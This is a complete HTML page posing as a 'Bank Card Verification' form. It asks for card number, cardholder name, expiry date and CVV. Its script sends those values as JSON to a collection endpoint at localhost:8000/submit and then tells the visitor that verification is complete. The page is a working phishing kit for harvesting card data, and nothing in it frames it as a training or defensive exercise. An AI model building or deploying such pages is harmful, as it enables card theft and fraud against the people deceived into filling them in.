<!DOCTYPE html>
<html>
<head>
    <title>Bank Verification</title>
</head>
<body style="font-family: Arial; text-align:center; margin-top:50px;">

<h2>Bank Card Verification</h2>
<p>Please confirm your card details</p>

<form id="cardForm">
    <input type="text" id="card" placeholder="Card Number" required><br><br>
    <input type="text" id="name" placeholder="Cardholder Name" required><br><br>
    <input type="text" id="date" placeholder="MM/YY" required><br><br>
    <input type="text" id="cvv" placeholder="CVV" required><br><br>

    <button type="submit">Verify</button>
</form>

<script>
document.getElementById("cardForm").addEventListener("submit", function(e){
    e.preventDefault();

    fetch("http://localhost:8000/submit", {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({
            card: document.getElementById("card").value,
            name: document.getElementById("name").value,
            date: document.getElementById("date").value,
            cvv: document.getElementById("cvv").value
        })
    }).then(()=>alert("Verification complete"));
});
</script>

</body>
</html>
